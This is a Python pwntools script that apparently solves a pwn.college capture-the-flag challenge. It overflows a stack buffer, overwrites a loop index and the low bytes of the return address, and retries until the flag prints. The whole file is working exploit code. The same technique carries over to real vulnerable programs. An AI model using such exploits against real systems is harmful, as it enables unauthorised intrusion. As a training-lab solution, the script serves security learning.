#!/usr/bin/python3

from pwn import *
import time
import re
from binascii import unhexlify

context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/loop-lunacy-hard')


base_pointer = 0x7ffc637f8430
input_start = base_pointer - 0x70
input_stop = base_pointer - 0x70 + 96
buffer_size = input_stop - input_start
ret_add = base_pointer + 8
distance_from_input_to_ret_add = ret_add - input_start

payload_len = distance_from_input_to_ret_add + 2

payload = cyclic(buffer_size+1) + chr(distance_from_input_to_ret_add - 1).encode() + b"\xe4\x2f"
while 1:
    io = process()
    io.send(str(payload_len).encode())
    time.sleep(0.6)
    io.send(payload)
    final_data = io.recvall()
    #print(final_data.decode())
    if b"pwn.college" in final_data:
        print(final_data.decode())
        break
    io.close()
